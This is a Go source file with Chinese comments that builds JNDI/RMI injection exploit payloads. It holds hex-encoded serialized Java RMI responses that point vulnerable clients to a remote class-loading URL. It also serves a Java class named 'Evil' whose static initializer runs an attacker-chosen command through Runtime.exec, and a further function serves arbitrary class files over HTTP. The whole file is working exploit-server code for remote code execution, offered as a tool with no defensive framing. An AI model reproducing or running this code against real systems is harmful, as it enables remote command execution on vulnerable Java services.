package tools

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
)

func Getrmires(ip string, port int) []byte {
	var res bytes.Buffer
	// 当IP为11位时，类的域长度为52，且该对象只有IP的所占字节数是可变的，因此计算长度差距即可
	var hexlen string
	if len(ip) >= 11 {
		l := len(ip) - 11
		hexlen = fmt.Sprintf("%X", 52+l)
	} else {
		l := 11 - len(ip)
		hexlen = fmt.Sprintf("%X", 52-l)
	}
	// 当IP为11位时，类的域长度为52，且该对象只有IP的所占字节数是可变的，因此计算长度差距即可
	hexdata := "51aced0005770f0148aef78f0000018770ac4ed880087372002f636f6d2e73756e2e6a6e64692e726d692e72656769737472792e5265666572656e6365577261707065725f537475620000000000000002020000707872001a6a6176612e726d692e7365727665722e52656d6f746553747562e9fedcc98be1651a020000707872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000070787077" + hexlen + "000a556e6963617374526566000b3139322e3136382e312e330000e75076c897a3101d88c648aef78f0000018770ac4ed880010178"
	data, _ := hex.DecodeString(hexdata)
	datalen := len(data)
	predata := data[0 : datalen-40]
	enddata := data[datalen-24:]
	port1 := uint16(port)
	p1 := byte(port1 >> 8)   // 高八位
	p2 := byte(port1 & 0xff) // 低八位
	res.Write(predata)
	res.WriteByte(byte(len(ip)))
	res.WriteString(ip)
	res.Write([]byte{0, 0})
	res.WriteByte(p1)
	res.WriteByte(p2)
	res.Write(enddata)
	return res.Bytes()
}

//rmi响应包，带一个Remote对象，可以自定义IP和端口

func Getclasslocation(ip string, port string, classname string) []byte {
	CL := len(classname)
	url := "http://" + ip + ":" + port + "/"
	UL := len(url)
	var buff bytes.Buffer
	s, _ := hex.DecodeString("51aced0005770f01bdf2f0ef0000018773b115528004737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00024c0009636c6173734e616d6571007e0002707870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b7078700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c0200007078700000000a70707070707070707070787400044576696c74001a687474703a2f2f3139322e3136382e3232392e333a383030302f71007e0009")
	dl := len(s)
	predata := s[:dl-39]
	buff.Write(predata)
	buff.WriteByte(byte(CL))
	buff.Write([]byte(classname))
	buff.WriteByte(byte(116))
	buff.WriteByte(byte(00))
	buff.WriteByte(byte(UL))
	buff.Write([]byte(url))
	buff.Write([]byte{0x71, 0x00, 0x7e, 0x00, 0x09})
	return buff.Bytes()
}

func GethttpEvilClass(cmd string) []byte {
	s := "cafebabe0000003400190100044576696c0700010100106a6176612f6c616e672f4f626a65637407000301000a536f7572636546696c650100094576696c2e6a6176610100083c636c696e69743e010003282956010004436f64650100116a6176612f6c616e672f52756e74696d6507000a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c000c000d0a000b000e01000463616c6308001001000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c001200130a000b00140100063c696e69743e0c001600080a000400170021000200040000000000020008000700080001000900000016000200000000000ab8000f1211b6001557b100000000000100160008000100090000001100010001000000052ab70018b10000000000010005000000020006"
	data, _ := hex.DecodeString(s)
	var buf bytes.Buffer
	buf.WriteString("HTTP/1.1 200 OK\r\n")
	buf.WriteString("Content-Length: ")
	dl := strconv.Itoa(len(data))
	buf.WriteString(dl)
	buf.WriteString("\r\n")
	buf.WriteString("\r\n")
	buf.Write(data[:162])
	cl := len(cmd)
	buf.WriteByte(byte(cl >> 8))
	buf.WriteByte(byte(cl & 0xff))
	buf.WriteString(cmd)
	buf.Write(data[168:])
	return buf.Bytes()
}

func GethttpEvilClassfromfile(path string) []byte {
	data, err := os.ReadFile(path)
	if err != nil {
		panic("文件没有权限读取")
	}
	var buf bytes.Buffer
	buf.WriteString("HTTP/1.1 200 OK\r\n")
	buf.WriteString("Content-Length: ")
	dl := strconv.Itoa(len(data))
	buf.WriteString(dl)
	buf.WriteString("\r\n")
	buf.WriteString("\r\n")
	buf.Write(data)
	return buf.Bytes()
}
